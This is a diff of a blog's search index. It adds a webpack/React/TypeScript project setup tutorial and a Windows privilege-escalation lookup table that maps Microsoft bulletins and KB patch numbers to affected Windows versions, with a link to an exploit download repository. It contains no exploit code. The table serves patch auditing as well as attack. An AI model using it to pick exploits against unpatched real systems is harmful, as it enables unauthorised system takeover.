class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-051</span> 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-010</span> 　[KB3036220]　　[Kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS15<span class="number">-015</span> 　[KB3031432]　　[Kernel Driver]　　(Win7/<span class="number">8</span>/<span class="number">8.1</span>/<span class="number">2012</span>/RT/<span class="number">2012</span> R2/<span class="number">2008</span> R2)</span><br><span class="line">MS15<span class="number">-001</span> 　[KB3023266]　　[Kernel Driver]　　(<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-070</span> 　[KB2989935]　　[Kernel Driver]　　(<span class="number">2003</span>)</span><br><span class="line">MS14<span class="number">-068</span> 　[KB3011780]　　[Domain Privilege Escalation]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-058</span> 　[KB3000061]　　[Win32k.sys]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-040</span> 　[KB2975684]　　[AFD Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-002</span> 　[KB2914368]　　[NDProxy]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS13<span class="number">-053</span> 　[KB2850851]　　[win32k.sys]　　(XP/Vista/<span class="number">2003</span>/<span class="number">2008</span>/win <span class="number">7</span>)</span><br><span class="line">MS13<span class="number">-046</span> 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>)</span><br><span class="line">MS13<span class="number">-005</span> 　[KB2778930]　　[Kernel Mode Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/win7/<span class="number">8</span>)</span><br><span class="line">MS12<span class="number">-042</span> 　[KB2972621]　　[Service Bus]　　(<span class="number">2008</span>/<span class="number">2012</span>/win7)</span><br><span class="line">MS12<span class="number">-020</span> 　[KB2671387]　　[RDP]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS11<span class="number">-080</span> 　[KB2592799]　　[AFD.sys]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS11<span class="number">-062</span> 　[KB2566454]　　[NDISTAPI]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS11<span class="number">-046</span> 　[KB2503665]　　[AFD.sys]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS11<span class="number">-011</span> 　[KB2393802]　　[kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP/Vista)</span><br><span class="line">MS10<span class="number">-092</span> 　[KB2305420]　　[Task Scheduler]　　(<span class="number">2008</span>/<span class="number">7</span>)</span><br><span class="line">MS10<span class="number">-065</span> 　[KB2267960]　　[FastCGI]　　(IIS <span class="number">5.1</span>, <span class="number">6.0</span>, <span class="number">7.0</span>, <span class="keyword">and</span> <span class="number">7.5</span>)</span><br><span class="line">MS10<span class="number">-059</span> 　[KB982799]　　 [ACL-Churraskito]　　(<span class="number">2008</span>/<span class="number">7</span>/Vista)</span><br><span class="line">MS10<span class="number">-048</span> 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/<span class="number">2003</span> SP2/Vista SP1 &amp; SP2/<span class="number">2008</span> Gold &amp; SP2 &amp; R2/Win7)</span><br><span class="line">MS10<span class="number">-015</span> 　[KB977165]　　 [KiTrap0D]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS09<span class="number">-050</span> 　[KB975517]　　 [Remote Code Execution]　　(<span class="number">2008</span>/Vista)</span><br><span class="line">MS09<span class="number">-020</span> 　[KB970483]　　 [IIS <span class="number">6.0</span>]　　(IIS <span class="number">5.1</span> <span class="keyword">and</span> <span class="number">6.0</span>)</span><br><span class="line">MS09<span class="number">-012</span> 　[KB959454]　　 [Chimichurri]　　(Vista/win7/<span class="number">2008</span>/Vista)</span><br><span class="line">MS08<span class="number">-068</span> 　[KB957097]　　 [Remote Code Execution]　　(<span class="number">2000</span>/XP)</span><br><span class="line">MS08<span class="number">-067</span> 　[KB958644]　　 [Remote Code Execution]　　(Windows <span class="number">2000</span>/XP/Server <span class="number">2003</span>/Vista/Server <span class="number">2008</span>)</span><br><span class="line">MS08<span class="number">-025</span> 　[KB941693]　　 [Win32.sys]　　(XP/<span class="number">2003</span>/<span class="number">2008</span>/Vista)</span><br><span class="line">MS06<span class="number">-040</span> 　[KB921883]　　 [Remote Code Execution]　　(<span class="number">2003</span>/xp/<span class="number">2000</span>)</span><br><span class="line">MS05<span class="number">-039</span> 　[KB899588]　　 [PnP Service]　　(Win <span class="number">9</span>X/ME/NT/<span class="number">2000</span>/XP/<span class="number">2003</span>)</span><br><span class="line">MS03<span class="number">-026</span> 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/<span class="number">2000</span>/XP/<span class="number">2003</span>)</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
     <title>webpack4打包原理</title>
     <url>/2019/05/19/webpack4%E6%89%93%E5%8C%85%E5%8E%9F%E7%90%86/</url>
     <content><![CDATA[<blockquote>
@@ -661,6 +633,60 @@ supervisorctl  stop [all]|[name] #关闭所有/指定的程序进程
 ]]></content>
       <categories>
         <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>webpack构建react项目</title>
+    <url>/2020/08/10/webapck%E6%9E%84%E5%BB%BAreact/</url>
+    <content><![CDATA[<h4 id="1-创建基本项目结构"><a href="#1-创建基本项目结构" class="headerlink" title="1.创建基本项目结构"></a>1.创建基本项目结构</h4><p>安装react typescript</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add react react-dom</span><br><span class="line"></span><br><span class="line">yarn add -D @types/react @types/react-dom</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add typescript -D</span><br></pre></td></tr></table></figure>
+<p>配置typescript</p>
+<p>tsconfig.json</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"compilerOptions"</span>: &#123;</span><br><span class="line">        <span class="string">"jsx"</span>: <span class="string">"react"</span>, <span class="comment">//在tsx里面支持jsx</span></span><br><span class="line">        <span class="string">"isolatedModules"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"esModuleInterop"</span>:<span class="literal">true</span>, </span><br><span class="line">        <span class="comment">//允许从没有设置默认导出的模块中默认导入 import * as fs from 'fs' 等于 import fs from 'fs'</span></span><br><span class="line">        <span class="string">"strict"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"baseUrl"</span>:<span class="string">"./"</span>, <span class="comment">//解析非相对模块名的基准目录</span></span><br><span class="line">        <span class="string">"paths"</span>: &#123;</span><br><span class="line">            <span class="comment">// 配置模块路径映射</span></span><br><span class="line">            <span class="string">"@/*"</span>: [<span class="string">"./src/*"</span>],</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"skipLibCheck"</span>:<span class="literal">true</span>,<span class="comment">//忽略所有的声明文件（ *.d.ts）的类型检查</span></span><br><span class="line">        <span class="comment">// 下面这些选项对 babel 编译 TypeScript 没有作用但是可以让 VSCode 等编辑器正确提示错误</span></span><br><span class="line">        <span class="string">"target"</span>: <span class="string">"ES2019"</span>,</span><br><span class="line">        <span class="string">"module"</span>: <span class="string">"ESNext"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"include"</span>: [</span><br><span class="line">        <span class="string">"./src/**/*"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>src/App.tsx</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React from &apos;react&apos;;</span><br><span class="line"></span><br><span class="line">const App = React.memo(()=&gt;&#123;</span><br><span class="line">    return (</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            hello world</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure>
+<p>src/index.tsx</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React from &apos;react&apos;;</span><br><span class="line">import ReactDOM from &apos;react-dom&apos;;</span><br><span class="line">import App from &apos;./App&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    &lt;App/&gt;,</span><br><span class="line">    document.getElementById(&apos;app&apos;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>public/index.html</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="2-编译tsx打包"><a href="#2-编译tsx打包" class="headerlink" title="2.编译tsx打包"></a>2.编译tsx打包</h4><p>安装webpack</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add -D webpack webpack-cli</span><br></pre></td></tr></table></figure>
+<p>安装babel编译ts,jsx</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add babel-loader @babel/core @babel/preset-typescript @babel/preset-react -D</span><br></pre></td></tr></table></figure>
+<p>babel.config.json</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"presets"</span>:[</span><br><span class="line">      <span class="string">"@babel/preset-react"</span>,</span><br><span class="line">      <span class="string">"@babel/preset-typescript"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>webpack 添加babel-loder</p>
+<p>webpack.dev.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    mode: <span class="string">"development"</span>,</span><br><span class="line">    devtool: <span class="string">"inline-source-map"</span>,</span><br><span class="line">    entry: <span class="string">'./src/index.tsx'</span>,</span><br><span class="line">    output: &#123;</span><br><span class="line">        publicPath:<span class="string">'./public'</span>,</span><br><span class="line">        filename: <span class="string">'[name].js'</span>,</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">'./dist'</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">    resolve: &#123;</span><br><span class="line">        <span class="comment">// 导入ts 等模块一般不写后缀名，webpack 会尝试使用这个数组提供的后缀名去导入</span></span><br><span class="line">        extensions: [<span class="string">'.ts'</span>, <span class="string">'.tsx'</span>, <span class="string">'.js'</span>, <span class="string">'.json'</span>],</span><br><span class="line">        alias:&#123;</span><br><span class="line">            <span class="string">"@"</span>: path.resolve(__dirname, <span class="string">'src/'</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">          &#123;</span><br><span class="line">            test: <span class="regexp">/\.(tsx?|js)$/</span>,</span><br><span class="line">            loader: <span class="string">'babel-loader'</span>,</span><br><span class="line">            options: &#123; <span class="attr">cacheDirectory</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">            include: [</span><br><span class="line">                path.resolve(__dirname, <span class="string">"src"</span>)</span><br><span class="line">            ],</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="3-webpack-dev-server"><a href="#3-webpack-dev-server" class="headerlink" title="3.webpack-dev-server"></a>3.webpack-dev-server</h4><p>每次都要webpack打包，刷新浏览器很麻烦，通过webpack-dev-server本地开启一个server，文件变更后自动编译更新。webpack-dev-server打包后的文件在内存中并没有实际的文件。打包后的文件访问通过output.publicPath控制，默认是根目录，也就是dev server的根目录</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add -D webpack-dev-server</span><br></pre></td></tr></table></figure>
+<p>package.json scripts</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"build"</span>: <span class="string">"webpack --config webpack.dev.js"</span>,</span><br><span class="line">    <span class="attr">"dev"</span>: <span class="string">"webpack-dev-server --config webpack.dev.js --open --hot"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="4-使用html-webpack-plugin自动插入bundle-js"><a href="#4-使用html-webpack-plugin自动插入bundle-js" class="headerlink" title="4.使用html-webpack-plugin自动插入bundle.js"></a>4.使用html-webpack-plugin自动插入bundle.js</h4><p>可以根据模版文件，插入bundle.js后生成新的文件</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add html-webpack-plugin -D</span><br></pre></td></tr></table></figure>
+<p>webpack.dev.js</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  plugins: [</span><br><span class="line">        new HtmlWebpackPlugin(&#123;</span><br><span class="line">          template: './public/index.html'  // 在  output.path 目录下生成文件</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="5-eslint-代码风格"><a href="#5-eslint-代码风格" class="headerlink" title="5.eslint 代码风格"></a>5.eslint 代码风格</h4><p>.eslintrc.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    root: <span class="literal">true</span>,</span><br><span class="line">    parser: <span class="string">'@typescript-eslint/parser'</span>,</span><br><span class="line">    plugins: [</span><br><span class="line">      <span class="string">'@typescript-eslint'</span>,</span><br><span class="line">    ],</span><br><span class="line">    extends: [</span><br><span class="line">      <span class="string">'eslint:recommended'</span>,</span><br><span class="line">      <span class="string">'plugin:@typescript-eslint/recommended'</span>,</span><br><span class="line">    ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><code>yarn eslint ./src --ext .ts,.tsx</code></p>
+]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+      <tags>
+        <tag>webpack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title> windows提权对照表		</title>
+    <url>/2018/08/03/windows-e6-8f-90-e6-9d-83-e5-af-b9-e7-85-a7-e8-a1-a8/</url>
+    <content><![CDATA[<p><a href="https://github.com/SecWiki/windows-kernel-exploits" title="exp下载地址" target="_blank" rel="noopener"><font color="#F08080">exp下载地址</font></a></p>
+<a id="more"></a>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Security Bulletin   #KB     #Description    #Operating System</span></span><br><span class="line"> </span><br><span class="line">CVE<span class="number">-2017</span><span class="number">-0213</span> 　[Windows COM Elevation of Privilege Vulnerability]　　(windows <span class="number">10</span>/<span class="number">8.1</span>/<span class="number">7</span>/<span class="number">2016</span>/<span class="number">2010</span>/<span class="number">2008</span>)</span><br><span class="line">MS17<span class="number">-010</span> 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows <span class="number">7</span>/<span class="number">2008</span>/<span class="number">2003</span>/XP)</span><br><span class="line">MS16<span class="number">-135</span> 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(<span class="number">2016</span>)</span><br><span class="line">MS16<span class="number">-098</span> 　[KB3178466]　　[Kernel Driver]　　(Win <span class="number">8.1</span>)</span><br><span class="line">MS16<span class="number">-075</span> 　[KB3164038]　　[Hot Potato]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS16<span class="number">-032</span> 　[KB3143141]　　[Secondary Logon Handle]　　(<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">10</span>/<span class="number">2012</span>)</span><br><span class="line">MS16<span class="number">-016</span> 　[KB3136041]　　[WebDAV]　　(<span class="number">2008</span>/Vista/<span class="number">7</span>)</span><br><span class="line">MS15<span class="number">-097</span> 　[KB3089656]　　[remote code execution]　　(win8<span class="number">.1</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-076</span> 　[KB3067505]　　[RPC]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-077</span> 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/<span class="number">2000</span>/<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-061</span> 　[KB3057839]　　[Kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-051</span> 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-010</span> 　[KB3036220]　　[Kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS15<span class="number">-015</span> 　[KB3031432]　　[Kernel Driver]　　(Win7/<span class="number">8</span>/<span class="number">8.1</span>/<span class="number">2012</span>/RT/<span class="number">2012</span> R2/<span class="number">2008</span> R2)</span><br><span class="line">MS15<span class="number">-001</span> 　[KB3023266]　　[Kernel Driver]　　(<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-070</span> 　[KB2989935]　　[Kernel Driver]　　(<span class="number">2003</span>)</span><br><span class="line">MS14<span class="number">-068</span> 　[KB3011780]　　[Domain Privilege Escalation]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-058</span> 　[KB3000061]　　[Win32k.sys]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-040</span> 　[KB2975684]　　[AFD Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-002</span> 　[KB2914368]　　[NDProxy]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS13<span class="number">-053</span> 　[KB2850851]　　[win32k.sys]　　(XP/Vista/<span class="number">2003</span>/<span class="number">2008</span>/win <span class="number">7</span>)</span><br><span class="line">MS13<span class="number">-046</span> 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>)</span><br><span class="line">MS13<span class="number">-005</span> 　[KB2778930]　　[Kernel Mode Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/win7/<span class="number">8</span>)</span><br><span class="line">MS12<span class="number">-042</span> 　[KB2972621]　　[Service Bus]　　(<span class="number">2008</span>/<span class="number">2012</span>/win7)</span><br><span class="line">MS12<span class="number">-020</span> 　[KB2671387]　　[RDP]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS11<span class="number">-080</span> 　[KB2592799]　　[AFD.sys]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS11<span class="number">-062</span> 　[KB2566454]　　[NDISTAPI]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS11<span class="number">-046</span> 　[KB2503665]　　[AFD.sys]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS11<span class="number">-011</span> 　[KB2393802]　　[kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP/Vista)</span><br><span class="line">MS10<span class="number">-092</span> 　[KB2305420]　　[Task Scheduler]　　(<span class="number">2008</span>/<span class="number">7</span>)</span><br><span class="line">MS10<span class="number">-065</span> 　[KB2267960]　　[FastCGI]　　(IIS <span class="number">5.1</span>, <span class="number">6.0</span>, <span class="number">7.0</span>, <span class="keyword">and</span> <span class="number">7.5</span>)</span><br><span class="line">MS10<span class="number">-059</span> 　[KB982799]　　 [ACL-Churraskito]　　(<span class="number">2008</span>/<span class="number">7</span>/Vista)</span><br><span class="line">MS10<span class="number">-048</span> 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/<span class="number">2003</span> SP2/Vista SP1 &amp; SP2/<span class="number">2008</span> Gold &amp; SP2 &amp; R2/Win7)</span><br><span class="line">MS10<span class="number">-015</span> 　[KB977165]　　 [KiTrap0D]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS09<span class="number">-050</span> 　[KB975517]　　 [Remote Code Execution]　　(<span class="number">2008</span>/Vista)</span><br><span class="line">MS09<span class="number">-020</span> 　[KB970483]　　 [IIS <span class="number">6.0</span>]　　(IIS <span class="number">5.1</span> <span class="keyword">and</span> <span class="number">6.0</span>)</span><br><span class="line">MS09<span class="number">-012</span> 　[KB959454]　　 [Chimichurri]　　(Vista/win7/<span class="number">2008</span>/Vista)</span><br><span class="line">MS08<span class="number">-068</span> 　[KB957097]　　 [Remote Code Execution]　　(<span class="number">2000</span>/XP)</span><br><span class="line">MS08<span class="number">-067</span> 　[KB958644]　　 [Remote Code Execution]　　(Windows <span class="number">2000</span>/XP/Server <span class="number">2003</span>/Vista/Server <span class="number">2008</span>)</span><br><span class="line">MS08<span class="number">-025</span> 　[KB941693]　　 [Win32.sys]　　(XP/<span class="number">2003</span>/<span class="number">2008</span>/Vista)</span><br><span class="line">MS06<span class="number">-040</span> 　[KB921883]　　 [Remote Code Execution]　　(<span class="number">2003</span>/xp/<span class="number">2000</span>)</span><br><span class="line">MS05<span class="number">-039</span> 　[KB899588]　　 [PnP Service]　　(Win <span class="number">9</span>X/ME/NT/<span class="number">2000</span>/XP/<span class="number">2003</span>)</span><br><span class="line">MS03<span class="number">-026</span> 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/<span class="number">2000</span>/XP/<span class="number">2003</span>)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>WEB安全</category>
       </categories>
   </entry>
 </search>
